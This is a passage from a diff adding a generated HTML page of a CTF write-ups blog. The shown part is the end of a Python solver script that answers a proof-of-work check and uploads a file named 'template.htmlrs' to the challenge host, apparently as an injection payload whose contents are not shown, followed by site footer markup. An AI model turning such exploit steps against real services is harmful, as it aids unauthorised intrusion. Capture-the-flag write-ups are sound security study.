+<span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;/pow&quot;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;answer&quot;</span><span class="p">:</span> <span class="n">solution</span><span class="p">})</span>
+
+<span class="n">files</span> <span class="o">=</span> <span class="p">{</span> <span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;template.htmlrs&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="p">}</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+                            <li><a href="https://moormaster.github.io/CtfWriteups/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
+
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <address id="about" class="vcard body">
+                Proudly powered by <a href="https://getpelican.com/">Pelican</a>, which takes great advantage of <a href="https://www.python.org/">Python</a>.
+                </address><!-- /#about -->
+
+                <p>The theme is by <a href="https://www.smashingmagazine.com/2009/08/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
+        </footer><!-- /#contentinfo -->
+
+</body>
+</html>
